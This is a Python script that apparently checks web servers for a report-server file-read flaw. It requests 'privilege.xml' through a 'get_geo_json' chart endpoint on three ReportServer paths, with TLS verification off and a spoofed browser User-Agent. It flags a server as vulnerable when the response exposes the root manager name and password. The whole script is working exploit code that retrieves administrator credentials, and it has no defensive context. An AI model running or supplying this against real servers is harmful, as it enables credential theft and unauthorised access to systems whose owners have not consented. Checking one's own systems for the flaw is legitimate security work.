import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "<rootManagerName>" in response.text and "<rootManagerPassword>" in response.text:
		r0=True
	else:
		r0=False
	url=baseurl+"WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "<rootManagerName>" in response.text and "<rootManagerPassword>" in response.text:
		r1=True
	else:
		r1=False
	url=baseurl+"ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "<rootManagerName>" in response.text and "<rootManagerPassword>" in response.text:
		r2=True
	else:
		r2=False
	if r0 or r1 or r2:
		return True
	else:
		return False
